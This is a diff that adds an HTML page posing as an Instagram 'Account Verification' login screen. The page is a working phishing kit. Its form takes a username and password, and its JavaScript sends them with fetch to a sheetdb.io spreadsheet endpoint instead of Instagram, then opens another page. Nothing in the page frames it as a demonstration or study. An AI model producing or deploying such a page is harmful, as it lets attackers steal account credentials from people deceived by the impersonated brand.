@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in</title>
+    <link href="sample.css" rel="stylesheet">
+</head>
+<body>
+    
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            </div>
+            <p align="center">Account Verification</p>
+            <form id="sheetdb-form" action="https://sheetdb.io/api/v1/tv65rfyoacan4" method="post" name="contact-form">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="footer">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('sheetdb-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            var form = event.target; // Get the form element
+            var formData = new FormData(form); // Create a FormData object from the form
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData, // Send the form data
+            })
+            .then(response => response.json()) // Parse the JSON response
+            .then(result => {
+                console.log('Success:', result);
+                window.open('d.html', '_blank'); // Open a new tab or window
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+
+</body>
+</html>
